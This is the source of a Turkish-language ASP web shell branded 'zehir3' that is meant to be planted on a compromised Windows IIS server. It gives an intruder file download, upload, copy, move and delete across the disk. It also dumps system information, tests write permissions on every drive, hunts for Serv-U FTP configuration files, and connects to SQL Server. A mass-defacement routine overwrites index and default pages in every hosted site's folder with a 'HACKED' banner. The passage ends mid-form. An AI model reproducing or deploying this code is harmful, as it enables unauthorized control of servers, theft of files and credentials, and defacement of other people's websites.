<%
mpat=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
dosyaPath = mid(mpat,InStrRev(mpat,"\")+1)
on error resume next
Dim objFSO,popup
Set objFSO = CreateObject ("Scripting.FileSystemObject")
if Request("kuskapani")=1 then
    Response.End
end if


if Request("kuskapani")=2 then
    on error resume next
    path = Request("path")
    sFolder = Request("SubFolder")
    fName = Request("FileName")
    d1 = Request("dosya1")
    d2 = Request("dosya2")
    d3 = Request("dosya3")
    d4 = Request("dosya4")
    bg__ = Request.Form("selectColour")
    if bg__ = "0" then bg__ = "#ffffff"
    byMesaj = "<body bgColor='"&bg__&"'>" & Request("byMesaj") & "<br><br><center><font color=gray size=2>HACKED " & Session("n2") & "3 ;)</font>"

    sFolder = Replace(sFolder,"/","\")

    if Right(sFolder,1)<>"\" then sFolder = sFolder & "\"
    Set f = objFSO.GetFolder(Path)
    Set fc = f.SubFolders
    h__ = 0
    f__ = 0
    ss__ = now
    For Each f1 In fc
        hedef_ = replace(f1.path,"/","\")
        if Right(hedef_,1)<>"\" then hedef_ = hedef_ & "\"
        hedef__ = left(hedef_,len(hedef_)-1)
        folderName_ = Right(hedef__, len(hedef__)-instrrev(hedef__,"\"))
            if d1<>"" then d1 = true
            if d2<>"" then d2 = true
            if d3<>"" then d3 = true
            if d4<>"" then d4 = true
            on error goto 0:on error resume next
            if fName<>"" then
                Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & fName, True)
                MyFile.write byMesaj
            end if
            if d1 then
                Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "index.htm", True)
                MyFile.write byMesaj
            end if
            if d2 then
                Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "default.htm", True)
                MyFile.write byMesaj
            end if
            if d3 then
                Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "index.asp", True)
                MyFile.write byMesaj
            end if
            if d4 then
                Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "default.asp", True)
                MyFile.write byMesaj
            end if

            if err<>0 then
                response.Write folderName_ & " <font color=red>[FAILED!]</font><br>"
                f__ = f__ + 1
            else
                response.Write folderName_ & " <font color=blue>[HACKED]</font><br>"
                h__ = h__ + 1
            end if
    Next
    ss___ = now
    response.Write "<br><font color=white>by zehir!...</font><br><b>Sonuc : </b> Toplam Süre : "&left(ss__-ss___,5)&"sn. ;)<br><font color=blue>Hacked</font> = "&h__&"<br><font color=red>Failed</font> = "&f__
    response.End
end if

status = Request("status")
path   = Request("path")
dPath  = Request("dPath")
arama  = Request("txArama")
dkayit = Request("dkayit")
table  = Request("table")
del    = Request("del")
islem  = Request("islem")
strSQL = Request("strSQL")
cf       = Request("cf")
pathfile = request("pathfile")
if path="" then path=request.servervariables("APPL_PHYSICAL_PATH")
if status="" then status=2
popup = true
'////////////////////////////////
Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile = BinaryStream.Read
End Function
if status="-3" then
    Response.Buffer=True
    Set Fil = objFSO.GetFile(pathfile)

    Response.contenttype="application/force-download"
    Response.AddHeader "Cache-control","private"
    Response.AddHeader "Content-Length", Fil.Size
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Fil.name

    Response.BinaryWrite readBinaryFile(Fil.path)
    Set f = Nothing: Set Fil = Nothing
    response.End()
end if
'//////////////////////////////////
if status="-4" then popup=false
if status="13" then popup=false
if status="14" then popup=false
if status="15" then popup=false
if status="16" then popup=false
if status="17" then popup=false
if status="18" then popup=false
if status="19" then popup=false
if status="33" then popup=false
if status="40" then popup=false
if status="50" then popup=false
byMsg = request.QueryString("byMsg")
if byMsg<>"" then response.Write byMsg
response.Write "<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>"
if popup then
%>
<center>
<a href="<%=dosyaPath%>?mevla=1&status=13" onclick="sistemBilgisi(this.href);return false;">System Info</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=40" onclick="sistemTest(this.href);return false;">System Test</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=50&path=<%=path%>" onclick="SitelerTestte(this.href);return false;">Sites Test</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=14&path=<%=path%>" onclick="klasorIslemleri(this.href);return false;">Folder Action</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=15" onclick="sqlServer(this.href);return false;">SQL Server</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=33" onclick="poweredby(this.href);return false;">POWERED BY</a>
<script language=javascript>
    function sistemBilgisi(yol){
        NewWindow(yol,"",600,240,"no");
    }
    function SitelerTestte(yol){
        NewWindow(yol,"",530,420,"no");
    }
    function klasorIslemleri(yol){
        NewWindow(yol,"",400,280,"no");
    }
    function sqlServer(yol){
        NewWindow(yol,"",300,50,"no");
    }
    function poweredby(yol){
        NewWindow(yol,"",300,50,"no");
    }
    function sistemTest(yol){
        NewWindow(yol,"",400,300,"no");
    }
</script>
<%
end if
'####################################
Class clsUpload
    Private mbinData
    Private mlngChunkIndex
    Private mlngBytesReceived
    Private mstrDelimiter
    Private CR
    Private LF
    Private CRLF
    Private mobjFieldAry()
    Private mlngCount

    Private Sub RequestData
        Dim llngLength
        mlngBytesReceived = Request.TotalBytes
        mbinData = Request.BinaryRead(mlngBytesReceived)
    End Sub

    Private Sub ParseDelimiter()
        mstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
    End Sub

    Private Sub ParseData()
        Dim llngStart
        Dim llngLength
        Dim llngEnd
        Dim lbinChunk
        llngStart = 1
        llngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)
        While Not llngStart = 0
            llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
            llngLength = llngEnd - llngStart
            lbinChunk = MidB(mbinData, llngStart, llngLength)
            Call ParseChunk(lbinChunk)
            llngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)
        Wend
    End Sub

    Private Sub ParseChunk(ByRef pbinChunk)
        Dim lstrName
        Dim lstrFileName
        Dim lstrContentType
        Dim lbinData
        Dim lstrDisposition
        Dim lstrValue
        lstrDisposition = ParseDisposition(pbinChunk)
        lstrName = ParseName(lstrDisposition)
        lstrFileName = ParseFileName(lstrDisposition)
        lstrContentType = ParseContentType(pbinChunk)
        If lstrContentType = "" Then
            lstrValue = CStrU(ParseBinaryData(pbinChunk))
        Else
            lbinData = ParseBinaryData(pbinChunk)
        End If
        Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)
    End Sub

    Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)
        Dim lobjField
        ReDim Preserve mobjFieldAry(mlngCount)
        Set lobjField = New clsField
        lobjField.Name = pstrName
        lobjField.FilePath = pstrFileName
        lobjField.ContentType = pstrContentType
        If LenB(pbinData) = 0 Then
            lobjField.BinaryData = ChrB(0)
            lobjField.Value = pstrValue
            lobjField.Length = Len(pstrValue)
        Else
            lobjField.BinaryData = pbinData
            lobjField.Length = LenB(pbinData)
            lobjField.Value = ""
        End If
        Set mobjFieldAry(mlngCount) = lobjField
        mlngCount = mlngCount + 1
    End Sub

    Private Function ParseBinaryData(ByRef pbinChunk)
        Dim llngStart
        llngStart = InStrB(1, pbinChunk, CRLF & CRLF)
        If llngStart = 0 Then Exit Function
        llngStart = llngStart + 4
        ParseBinaryData = MidB(pbinChunk, llngStart)
    End Function

    Private Function ParseContentType(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Type:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 15, pbinChunk, CR)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 15
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))
    End Function

    Private Function ParseDisposition(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Disposition:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 22
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))
    End Function

    Private Function ParseName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "name=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 6, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 6
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseName = Mid(pstrDisposition, llngStart, llngLength)
    End Function
' ------------------------------------------------------------------------------
    Private Function ParseFileName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "filename=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 10, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 10
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseFileName = Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Public Property Get Count()
        Count = mlngCount
    End Property

    Public Default Property Get Fields(ByVal pstrName)
        Dim llngIndex
        If IsNumeric(pstrName) Then
            llngIndex = CLng(pstrName)
            If llngIndex > mlngCount - 1 Or llngIndex < 0 Then
                Call Err.Raise(vbObjectError + 1, "clsUpload.asp", "Object does not exist within the ordinal reference.")
                Exit Property
            End If
            Set Fields = mobjFieldAry(pstrName)
        Else
            pstrName = LCase(pstrname)
            For llngIndex = 0 To mlngCount - 1
                If LCase(mobjFieldAry(llngIndex).Name) = pstrName Then
                    Set Fields = mobjFieldAry(llngIndex)
                    Exit Property
                End If
            Next
        End If
        Set Fields = New clsField
    End Property

    Private Sub Class_Terminate()
        Dim llngIndex
        For llngIndex = 0 To mlngCount - 1
            Set mobjFieldAry(llngIndex) = Nothing

        Next
        ReDim mobjFieldAry(-1)
    End Sub

    Private Sub Class_Initialize()
        ReDim mobjFieldAry(-1)
        CR = ChrB(Asc(vbCr))
        LF = ChrB(Asc(vbLf))
        CRLF = CR & LF
        mlngCount = 0
        Call RequestData
        Call ParseDelimiter()
        Call ParseData
    End Sub

    Private Function CStrU(ByRef pstrANSI)
        Dim llngLength
        Dim llngIndex
        llngLength = LenB(pstrANSI)
        For llngIndex = 1 To llngLength
            CStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
        Next
    End Function

    Private Function CStrB(ByRef pstrUnicode)
        Dim llngLength
        Dim llngIndex
        llngLength = Len(pstrUnicode)
        For llngIndex = 1 To llngLength
            CStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
        Next
    End Function
End Class
'####################################
Session("n1") = "by Ejder"
Class clsField
    Public Name
    Private mstrPath
    Public FileDir
    Public FileExt
    Public FileName
    Public ContentType
    Public Value
    Public BinaryData
    Public Length
    Private mstrText

    Public Property Get BLOB()
        BLOB = BinaryData
    End Property

    Public Function BinaryAsText()
        Dim lbinBytes
        Dim lobjRs
        If Length = 0 Then Exit Function
        If LenB(BinaryData) = 0 Then Exit Function

        If Not Len(mstrText) = 0 Then
            BinaryAsText = mstrText
            Exit Function
        End If
        lbinBytes = ASCII2Bytes(BinaryData)
           mstrText = Bytes2Unicode(lbinBytes)
        BinaryAsText = mstrText
    End Function

    Public Sub SaveAs(ByRef pstrFileName)
        Const adTypeBinary=1
        Const adSaveCreateOverWrite=2
        Dim lobjStream
        Dim lobjRs
        Dim lbinBytes
        If Length = 0 Then Exit Sub
        If LenB(BinaryData) = 0 Then Exit Sub
        Set lobjStream = Server.CreateObject("ADODB.Stream")
        lobjStream.Type = adTypeBinary
        Call lobjStream.Open()
        lbinBytes = ASCII2Bytes(BinaryData)
        Call lobjStream.Write(lbinBytes)

        On Error Resume Next

        Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)

        'if err<>0 then response.Write "<br>"&err.Description

        Call lobjStream.Close()
        Set lobjStream = Nothing
    End Sub

    Public Property Let FilePath(ByRef pstrPath)
        mstrPath = pstrPath
        If Not InStrRev(pstrPath, ".") = 0 Then
            FileExt = Mid(pstrPath, InStrRev(pstrPath, ".") + 1)
            FileExt = UCase(FileExt)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileName = Mid(pstrPath, InStrRev(pstrPath, "\") + 1)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, "\") - 1)
        End If
    End Property

    Public Property Get FilePath()
        FilePath = mstrPath
    End Property

    private Function ASCII2Bytes(ByRef pbinBinaryData)
        Const adLongVarBinary=205
        Dim lobjRs
        Dim llngLength
        Dim lbinBuffer
        llngLength = LenB(pbinBinaryData)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarBinary, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBinaryData & ChrB(0))
        Call lobjRs.Update()
        lbinBuffer = lobjRs.Fields("BinaryData").GetChunk(llngLength)
        Call lobjRs.Close()
        Set lobjRs = Nothing
        ASCII2Bytes = lbinBuffer
    End Function

    Private Function Bytes2Unicode(ByRef pbinBytes)
        Dim lobjRs
        Dim llngLength
        Dim lstrBuffer
        llngLength = LenB(pbinBytes)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarChar, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBytes)
        Call lobjRs.Update()
        lstrBuffer = lobjRs.Fields("BinaryData").Value
        Call lobjRs.Close()
        Set lobjRs = Nothing
        Bytes2Unicode = lstrBuffer
    End Function
End Class
Session("n2") = "EJDER"
'####################################
function addslash(path)
    if right(path,1)="\" then addslash=path else addslash=path & "\"
end function

sub Upload()
    dim objUpload,f,max,i,name,path,size,success

    set objUpload=New clsUpload

    targetPath=objUpload.Fields("folder").Value
    max=objUpload.Fields("max").Value

    for i=1 to max
        name=objUpload.Fields("file" & i).FileName
        size=objUpload.Fields("file" & i).Length
        if (name<>"") and (size>0) then
            gMsg=gMsg & "<br>" & vbNewLine & "- " & name & " (" & FormatNumber(size,0) & " bytes): "
            path=addslash(targetPath) & name
            objUpload.Fields("file" & i).SaveAs path

            if objFSO.FileExists(path) then
                on error resume next
                set f=objFSO.GetFile(path)
                if IsObject(f) then
                    if f.Size=size then success=true else success=false
                end if
                set f=nothing
            end if
            if success then  gMsg=gMsg & "<font color=blue>uploaded</font>" else gMsg = gMsg & "<font color=red>failed!</font>"
        end if
    next
    response.Write gMsg
    set objUpload=nothing

end sub

if status="-4" then
    Upload()
'    hataKontrol
    popup=false
end if
'////////////////////////////////
sub hataKontrol
    if err<>0 then
        Response.Write "<font color=red size=2>Hata : "&err.Description&"</font>"
    end if
end sub

sub araBul(path_,ara_)
    on error resume next
    If Len(path_) > 0 Then
        cur = path_&"\"
        If cur = "\\" Then cur = ""
            parent = ""
            If InStrRev(cur,"\") > 0 Then
            parent = Left(cur, InStrRev(cur, "\", Len(cur)-1))
        End If
    Else
        cur = ""
    End If

    Set f = objFSO.GetFolder(cur)

    Set fc = f.Files
    For Each f1 In fc
        if lcase(InStr(1,f1.name,lcase(ara_)))>0 then
            downStr = "<font face=webdings size=5><a href='"&dosyapath&"?status=-3&pathFile="&f1.path&"&Time="&time&"'>Í</a></font>"
            if lcase(ara_)="mdb" then
                Response.Write downStr&"<font face=wingdings size=5><a href='"&dosyapath&"?status=3&path="&path_&"&Del="&f1.path&"&Time="&time&"'>û</a></font> * <a href='"&dosyapath&"?status=7&path="&f1.path&"&Time="&time&"'>"&f1.path&" ["&f1.size&"]"&"</a></b><br>"
            else
                Response.Write downStr&"<font face=wingdings size=5><a href='"&dosyapath&"?status=3&path="&path_&"&Del="&f1.path&"&Time="&time&"'>û</a><a href='"&dosyapath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a></font> - <a href='"&dosyapath&"?status=5&path="&f1.path&"&Time="&time&"'>"&f1.path&" ["&f1.size&"]"&"</a></b><br>"
            end if
        end if
    Next

    Set fs = f.SubFolders
    For Each f1 In fs
        araBul f1.path,ara_
    Next
    Set    f        = Nothing
    Set fc        = Nothing
    Set fs        = Nothing
end sub

sub sistemTest
    response.Write "<table width='100%' align=center cellpadding=0 cellspacing=0 border=1>"
    response.Write "<tr bgcolor=#ffffc0><td width='30%' align=center><font color=navy><b>Konum</td><td width='70%' align=center><font color=navy><b>Sonuç</td></tr>"

    servu_Test
    WriteTestOnDriver
    WriteTestOnLocalPath
    LocalPathParentFolder
    LocalPathPParentFolder

    response.Write "</table>"
end sub

sub servu_Test
    dosya_ = Array("Program Files\Serv-u\Serv-u.ini", "Program Files\Serv-u\Serv-u daemon.ini", "Serv-u\Serv-u.ini", "Serv-u\Serv-u daemon.ini")
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=2 or drive_.Drivetype=3 then
            for each d_ in dosya_
                d_ = drive_.DriveLetter&":\"&d_
                if objFSO.FileExists(d_) then
                    response.Write "<tr><td><b>Serv-U ini file : </td><td><font color=yellow>"&d_&"</td></tr>"
                end if
            next
        end if
    next
end sub

function yaziyomu(yol)
    on error goto 0:on error resume next
    dim sonuc__
    Set MyFile = objFSO.CreateTextFile(yol & "\test.zehir", True)
    MyFile.write "byzehir <zehirhacker@hotmail.com>"
    set MyFile = Nothing
    if err<>0 then
        sonuc__="<font color=red>Yazma Hakký Yok!</font>"
    else
        sonuc__="<font color=yellow>Yazma Hakký Var!</font>"
        on error goto 0: on error resume next
        objFSO.DeleteFile yol & "\test.zehir",true
        if err<>0 then
            sonuc__=sonuc__&"<br><font color=red>Silme Hakký Yok!</font>"
        else
            sonuc__=sonuc__&"<br><font color=yellow>Silme Hakký Var!</font>"
        end if
    end if
    yaziyomu = sonuc__
end function

function yaziyomu2(yol)
    on error goto 0:on error resume next
    Set MyFile = objFSO.CreateTextFile(yol & "\test.zehir", True)
    MyFile.write "byzehir <zehirhacker@hotmail.com>"
    set MyFile = Nothing
    if err<>0 then
        yaziyomu2 = false
    else
        objFSO.DeleteFile yol & "\test.zehir"
        yaziyomu2 = true
    end if
end function

sub WriteTestOnDriver
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=2 or drive_.Drivetype=3 then
            if not yaziyomu2(drive_.DriveLetter&":\") then
                Response.Write "<tr><td><b>"&drive_.DriveLetter&":\</td><td><font color=red>yazma yetkisi yok! : ["&err.Description&"]</td></tr>"
            else
                Response.Write "<tr><td><b>"&drive_.DriveLetter&":\</td><td><font color=yellow>yazma yetkisi var!</td></tr>"
            end if
        end if
    next
end sub

sub WriteTestOnLocalPath
    on error goto 0
    on error resume next
    if not yaziyomu2(request.servervariables("APPL_PHYSICAL_PATH")) then
        Response.Write "<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : ["&err.Description&"]</td></tr>"
    else
        Response.Write "<tr><td><b>Local Path </td><td><font color=yellow>yazma yetkisi var!</td></tr>"
    end if
end sub

sub LocalPathParentFolder
    on error goto 0
    on error resume next
    hed_ = request.servervariables("APPL_PHYSICAL_PATH")
    if Right(hed_,1)="\" then hed_ = left(hed_,len(hed_)-1)
    parhed_ = left(hed_,InStrRev(hed_,"\"))

    Set f = objFSO.GetFolder(parhed_)
    Set fc = f.SubFolders

    int_fol=0
    int_fil=0
    For Each f1 In fc
        int_fol=int_fol+1
    Next

    Set fc = f.files
    For Each f1 In fc
        int_fil=int_fil+1
    Next

    if err<>0 then
        Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><font color=red>Hata Oluþtu : ["&err.Description&"]</td></tr>"
    else
        Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><font color=yellow>Folder : "&FormatNumber(int_fol,0)&"<br>File : "&FormatNumber(int_fil,0)&"</td></tr>"
    end if
end sub

sub LocalPathPParentFolder
    on error goto 0
    on error resume next
    hed_ = request.servervariables("APPL_PHYSICAL_PATH")
    if Right(hed_,1)="\" then hed_ = left(hed_,len(hed_)-1)
    hed_ = left(hed_,InStrRev(hed_,"\"))
    if Right(hed_,1)="\" then hed_ = left(hed_,len(hed_)-1)
    parhed_ = left(hed_,InStrRev(hed_,"\"))

    Set f = objFSO.GetFolder(parhed_)
    Set fc = f.SubFolders
    int_fol=0
    int_fil=0
    For Each f1 In fc
        int_fol=int_fol+1
    Next

    Set fc = f.files
    For Each f1 In fc
        int_fil=int_fil+1
    Next

    if err<>0 then
        if err=451 then
            Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=red>Data Üst Klasor Yok :)</td></tr>"
        else
            Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=red>Hata Oluþtu : ["&err.Description&"]</td></tr>"
        end if
    else
        Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=yellow>Folder : "&FormatNumber(int_fol,0)&"<br>File : "&FormatNumber(int_fil,0)&"</td></tr>"
    end if
end sub

SELECT CASE status
CASE 13 'Sistem Bilgisi
    Response.Write "<table width=100% cellpadding=0 cellspacing=0><tr><td colspan=2 align=center><font color=yellow face='courier new'><b><font style='FONT-WEIGHT:normal' color=red face=wingdings>:</font> Sistem Bilgileri <font color=red face=wingdings style='FONT-WEIGHT:normal'>:</font></td></tr>"
    Response.Write "<tr><td><b><font color=red>Local Adres</td><td> " & request.servervariables("REMOTE_ADDR") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>User Agent</td><td> " & request.servervariables("HTTP_USER_AGENT") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>Server</td><td> " & request.servervariables("SERVER_NAME") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>IP</td><td> " & request.servervariables("LOCAL_ADDR") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>HTTPD</td><td> " & request.servervariables("SERVER_SOFTWARE") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>Port</td><td> " & request.servervariables("SERVER_PORT") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>Yol</td><td> " & request.servervariables("APPL_PHYSICAL_PATH") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>Log Root</td><td> " & request.servervariables("APPL_MD_PATH") & "</td></tr>"
    Response.Write "<tr><td><b><font color=red>HTTPS</td><td> " & request.servervariables("HTTPS") & "</td></tr>"
    Response.Write "</table>"
    popup = false
CASE 14 'Upload and Search
    aramaUpload
    popup = false
    hataKontrol
CASE 15 'Ms. SQL Server
    Response.Write "<form method=get action='"&DosyPath&"' target='_opener' id=form1 name=form1>"
    Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server için connection string giriniz</td></tr><tr><td align=center>"
    Response.Write "<input type=hidden value='7' name=status><input type=hidden value='"&time&"' name=Time>"
    Response.Write "<input style='width:250; height:21' value='' name=path><br>"
    response.Write "<input type=submit value='SQL Servera Baðlan' style='height:23;width:170' id=submit1 name=submit1>"
    Response.Write "</td></tr></table>"
    response.Write "</form>"

    popup = false
    hataKontrol
CASE 16 'file Copy window
    Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
    Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td width=100><font size=2>Kop. Yer : </td><td>"
    Response.Write "<input type=hidden value='17' name=status><input type=hidden value='"&PathFile&"' name=path><input type=hidden value='"&time&"' name=Time>"
    Response.Write "<input style='width:250; height:21' value='"&PathFile&"' name=cf>"
    response.Write "<input type=submit value='Kopyala' style='height:22;width:70' id=submit1 name=submit1>"
    Response.Write "</td></tr><tr><td colspan=3 align=center><font size=2>"
    response.Write "<input type=radio name='islem' value='kopyala' checked>Kopyala"
    response.Write "<input type=radio name='islem' value='tasi'>Tasi"
    response.Write "</table>"
    response.Write "</form>"

    popup = false
    hataKontrol
CASE 17 'file Copy
    isl = ""
    if islem="kopyala" then
        objFSO.CopyFile path,cf
        isl="kopyalandý.."
    elseif islem="tasi" then
        objFSO.MoveFile path,cf
        isl="taþýndý.."
    end if
    response.Write "Dosya "&isl
    response.Write "<br><font color=red>Kaynak : </font>"&path&"<br><font color=red>Hedef : </font>"&cf
    response.Write "<br>"
    popup = false
    hataKontrol
CASE 18 'folder Copy window
    Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
    Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td width=100><font size=2>Kop. Yer : </td><td>"
    Response.Write "<input type=hidden value='19' name=status><input type=hidden value='"&PathFile&"' name=path><input type=hidden value='"&time&"' name=Time>"
    Response.Write "<input style='width:250; height:21' value='"&PathFile&"' name=cf>"
    response.Write "<input type=submit value='Kopyala' style='height:22;width:70' id=submit1 name=submit1>"
    Response.Write "</td></tr><tr><td colspan=3 align=center><font size=2>"
    response.Write "<input type=radio name='islem' value='kopyala' checked>Kopyala"
    response.Write "<input type=radio name='islem' value='tasi'>Tasi"
    response.Write "</table>"
    response.Write "</form>"

    popup = false
    hataKontrol
CASE 19 'folder Copy
    isl = ""
    if islem="kopyala" then
        objFSO.CopyFolder path,cf
        isl="kopyalandý.."
    elseif islem="tasi" then
        objFSO.MoveFolder path,cf
        isl="taþýndý.."
    end if
    response.Write "Klasor "&isl
    response.Write "<br><font color=red>Kaynak : </font>"&path&"<br><font color=red>Hedef : </font>"&cf
    response.Write "<br>"
    popup = false
    hataKontrol
CASE 33 'Powered By
    response.Write "<body topmargin=5 leftmargin=0><center><h4>Powered by Zehir"
    response.Write "<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier new'>küllü nefsun zaifetun mevt"
    popup = false
    hataKontrol
CASE 40 'Sistem Test
    sistemTest
    popup=false
CASE 50 'Siteleri Test Edelim :D
    %>
    <table width="100%" cellpadding=0 cellspacing=0>
        <tr>
            <td align=center>
                <b>Güvenlik Testi byZehir</b>
                <br>
                <form action="<%=dosyaPath%>" method=post id=frmMesaj>
                    <input type=hidden name=kuskapani value=2>
                    <table width=500 align=center border=1 cellpadding=0 cellspacing=0>
                        <tr>
                            <td width=100>Path</td>
                            <td><input style="width:100%" type=text name="Path" id="Path" value="<%=path%>"></td>
                        </tr>
                        <tr>
                            <td width=100>Sub Folder</td>
                            <td><input style="width:100%" type=text name="SubFolder" id="SubFolder" value="www"></td>
                        </tr>
                        <tr>
                            <td width=100>File Name</td>
                            <td><input style="width:100%" type=text name="FileName" id="FileName" value="byejder.txt"></td>
                        </tr>
                        <tr>
                            <td colspan=2>
                                <table width="100%" align=center>
                                    <tr>
                                        <td width="50%">
                                            <input type=checkbox name="dosya1" ID="Checkbox1">index.htm<br>
                                            <input type=checkbox name="dosya2" ID="Checkbox2">default.htm<br>
                                        </td>
                                        <td width="50%">
                                            <input type=checkbox name="dosya3" ID="Checkbox3">index.asp<br>
                                            <input type=checkbox name="dosya4" ID="Checkbox4">default.asp<br>
                                        </td>
                                    </tr>
                                </table>
                            </td>
                        </tr>
                        <tr>
                            <td colspan=2 align=center>
                                <a href="#" onClick="FormatText('cut')" alt="Kes">Kes</a>
                                <a href="#" onClick="FormatText('copy')" alt="Kopyala">Kopyala</a>
                                <a href="#" onClick="FormatText('paste')" alt="Yapýþtýr">Yapýþtýr</a>
                                <a href="#" alt="Kalýn" onClick="FormatText('bold', '')">Bold</a>
                                <a href="#" alt="Ýtalic" onClick="FormatText('italic', '')">Italic</a>
                                <a href="#" alt="Altý Çizili" onClick="FormatText('underline', '')">UnderLine</a>
                                <a href="#" onClick="FormatText('JustifyLeft', '')" alt="Sola Hizalý">JustifyLeft</a>
                                <a href="#" alt="Ortada Hizalý" onClick="FormatText('JustifyCenter', '')">JustifyCenter</a>
                                <a href="#" onClick="FormatText('JustifyRight', '')" alt="Saða Hizalý">JustifyRight</a>
                                <a href="#" alt="Web Sitesi Linki Ekle" onClick="FormatText('createLink')">AddLink</a>
                                <a href="#" alt="Resim Ekle" onClick="AddImage()">AddImage</a>
                                <select name="selectColour" onChange="bgc(selectColour.options[selectColour.selectedIndex].value);" ID="selectColour">
                                  <option value="0" selected>-- Renk --</option>
                                  <option value="black">Siyah</option>
                                  <option value="white">Beyaz</option>
                                  <option value="blue">Mavi</option>
                                  <option value="red">Kýrmýzý</option>
                                  <option value="green">Yeþil</option>
                                  <option value="yellow">Sarý</option>
                                  <option value="orange">Turuncu</option>
                                  <option value="brown">Kahverengi</option>
                                  <option value="magenta">Pembe</option>
                                  <option value="cyan">Açýk Mavi</option>
                                  <option value="limegreen">Açýk Yeþil</option>
                                </select>
                                <select name="a" onChange="FormatText('ForeColor', a.options[a.selectedIndex].value);" ID="a">
                                  <option value="0" selected>-- Renk --</option>
                                  <option value="black">Siyah</option>
                                  <option value="white">Beyaz</option>
                                  <option value="blue">Mavi</option>
                                  <option value="red">Kýrmýzý</option>
                                  <option value="green">Yeþil</option>
                                  <option value="yellow">Sarý</option>
                                  <option value="orange">Turuncu</option>
                                  <option value="brown">Kahverengi</option>
